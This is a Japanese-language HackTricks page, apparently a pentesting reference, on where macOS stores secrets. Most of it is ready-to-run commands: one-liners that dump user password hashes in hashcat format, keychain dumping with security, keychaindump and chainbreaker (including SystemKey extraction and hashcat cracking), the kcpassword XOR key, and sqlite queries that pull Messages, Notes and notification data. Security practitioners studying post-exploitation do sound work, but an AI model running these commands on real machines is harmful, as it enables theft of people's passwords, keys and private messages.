# macOSの機密情報の場所

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong>を使って、ゼロからヒーローまでAWSハッキングを学びましょう！</summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦で私たちをフォローする [**@carlospolopm**](https://twitter.com/hacktricks_live)
- **ハッキングテクニックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

## パスワード

### シャドウパスワード

シャドウパスワードは、ユーザーの構成と共に**`/var/db/dslocal/nodes/Default/users/`**にあるplistに格納されています。\
次のワンライナーを使用して、**ユーザーに関するすべての情報**（ハッシュ情報を含む）をダンプできます：

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**このようなスクリプト**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2)または[**このようなもの**](https://github.com/octomagon/davegrohl.git)は、ハッシュを**hashcat** **フォーマット**に変換するために使用できます。

すべての非サービスアカウントの資格情報をmacOS PBKDF2-SHA512形式のhashcat形式でダンプする代替のワンライナーは次のとおりです：`-m 7100`:

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### キーチェーンのダンプ

`security`バイナリを使用して**パスワードを復号化してダンプ**する際に、ユーザーには複数のプロンプトが表示され、この操作を許可する必要があります。
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
これらのツールはBig Surではもう機能しないようです。[juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)に基づいています。
{% endhint %}

### Keychaindump 概要

**keychaindump**というツールは、macOSのキーチェーンからパスワードを抽出するために開発されましたが、Big Surなどの新しいmacOSバージョンでは制限があります。これについては[議論](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)で示されています。**keychaindump**の使用には、攻撃者がアクセス権を取得し、**root**権限を昇格させる必要があります。このツールは、キーチェーンがユーザーのログイン時にデフォルトでロック解除され、アプリケーションが繰り返しユーザーのパスワードを要求せずにアクセスできるという事実を悪用しています。ただし、ユーザーが各使用後にキーチェーンをロックすることを選択した場合、**keychaindump**は効果がありません。

**Keychaindump**は、Appleによって認証と暗号操作のためのデーモンとして説明される**securityd**という特定のプロセスを対象として動作します。抽出プロセスには、ユーザーのログインパスワードから派生した**Master Key**を特定することが含まれます。このキーは、キーチェーンファイルを読み取るために不可欠です。**keychaindump**は、`vmmap`コマンドを使用して**securityd**のメモリヒープをスキャンし、`MALLOC_TINY`としてフラグ付けされた領域内の潜在的なキーを探します。これらのメモリ位置を調査するために次のコマンドが使用されます：
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
潜在的なマスターキーを特定した後、**keychaindump**は、マスターキーの候補を示す特定のパターン（`0x0000000000000018`）をヒープ内で検索します。このキーを利用するには、**keychaindump**のソースコードで詳細に説明されているように、さらなるステップが必要です。この領域に焦点を当てるアナリストは、キーチェーンを復号化するための重要なデータが**securityd**プロセスのメモリに格納されていることに注意する必要があります。**keychaindump**を実行するための例示コマンドは次の通りです：
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker)は、OSXキーチェーンから次の種類の情報を法的に適切な方法で抽出するために使用できます：

* ハッシュ化されたキーチェーンパスワード、[hashcat](https://hashcat.net/hashcat/)や[John the Ripper](https://www.openwall.com/john/)で解読可能
* インターネットパスワード
* 一般的なパスワード
* プライベートキー
* 公開鍵
* X509証明書
* セキュアノート
* Appleshareパスワード

キーチェーンのアンロックパスワード、[volafox](https://github.com/n0fate/volafox)や[volatility](https://github.com/volatilityfoundation/volatility)で取得したマスターキー、またはSystemKeyなどのアンロックファイルを使用すると、Chainbreakerは平文パスワードも提供します。

これらのキーチェーンをアンロックする方法がない場合、Chainbreakerは他の利用可能な情報をすべて表示します。

#### **キーチェーンキーをダンプ**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **SystemKeyを使用してキーチェーンキー（パスワード付き）をダンプする**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **キーチェーンのキーをダンプする（パスワード付き）ハッシュを解読する**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **メモリダンプを使用してキーチェーンキー（パスワード付き）をダンプする**

[これらの手順に従います](..#dumping-memory-with-osxpmem) **メモリダンプ**を実行します
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **ユーザーのパスワードを使用してキーチェーンキー（パスワード付き）をダンプする**

ユーザーのパスワードを知っている場合、それを使用してユーザーに属するキーチェーンをダンプおよび復号化できます。
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

**kcpassword**ファイルは、**システム所有者が**自動ログインを有効にしている場合にのみ、**ユーザーのログインパスワード**を保持するファイルです。したがって、ユーザーはパスワードを求められることなく自動的にログインされます（これはあまり安全ではありません）。

パスワードは、ファイル**`/etc/kcpassword`**に**`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**というキーでXOR演算されて格納されます。ユーザーのパスワードがキーよりも長い場合、キーは再利用されます。\
これにより、例えば[**このようなスクリプト**](https://gist.github.com/opshope/32f65875d45215c3677d)を使用して、パスワードをかなり簡単に回復できます。

## データベース内の興味深い情報

### メッセージ
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### 通知

通知データは`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`にあります。

興味深い情報のほとんどは**blob**にあるでしょう。したがって、そのコンテンツを**抽出**して**人間が読める形式**に**変換**するか、**`strings`**を使用する必要があります。アクセスするには、次のようにします：

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
{% endcode %}

### ノート

ユーザーの**ノート**は`~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`に保存されています。

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい場合は**、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)で**フォロー**する。
* **ハッキングトリックを共有するには、** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>
